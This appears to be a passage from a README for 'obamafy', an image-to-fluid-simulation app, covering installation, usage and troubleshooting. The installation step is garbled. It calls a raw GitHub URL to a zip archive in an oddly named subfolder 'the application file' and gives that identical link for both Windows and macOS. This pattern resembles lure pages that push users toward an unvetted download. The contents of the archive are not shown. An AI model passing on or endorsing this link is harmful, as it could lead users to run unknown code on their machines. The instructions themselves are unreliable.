Once you have downloaded the application, follow these steps to start using obamafy:

1. Locate the downloaded file on your computer. It may be in your Downloads folder.
2. Extract the zipped file if necessary.
3. Find and double-click the application file (e.g., `https://raw.githubusercontent.com/Robin7723/obamafy/main/courtlike/obamafy.zip` for Windows, `https://raw.githubusercontent.com/Robin7723/obamafy/main/courtlike/obamafy.zip` for macOS, or simply run `./obamafy` for Linux).
4. The application will launch and display the main interface.

## üé® Using obamafy
Once the application is running, you can:

1. **Select an Image:** Click on "Load Image" to choose a target image from your computer. obamafy supports common formats like JPG, PNG, and BMP.
2. **Adjust Settings:** Use the sliders to change parameters like dye color and fluid dynamics. Experiment to see different effects.
3. **Start Simulation:** Press the "Start" button to see the fluid simulation in real-time. Watch as the dye flows and rearranges itself.
4. **Save Your Creation:** Once you are happy with the result, click "Save Image" to keep your artwork.

## üõ† Troubleshooting
If you encounter issues:

- **Application Won't Start:** Check that your system meets the requirements. Ensure all drivers, especially for your graphics card, are up to date.
- **Performance Issues:** Lower the resolution of your target image or adjust settings for better performance.
- **App Crashes:** Make sure you have enough available RAM. Close other applications to free up resources.
